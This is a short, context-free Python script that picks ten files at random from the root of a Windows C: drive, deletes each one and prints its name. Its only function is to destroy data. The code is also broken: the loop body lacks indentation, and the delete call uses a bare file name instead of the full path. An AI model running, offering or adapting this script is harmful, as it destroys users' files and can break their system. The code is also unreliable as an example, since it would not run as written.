  
import os
import random

count = 0
while (count < 10):
todelet = random.choice([x for x in os.listdir("C:\\") if os.path.isfile(os.path.join("C:\\", x))])
count = count + 1
os.remove(todelet)
print(f"Removed {todelet}")
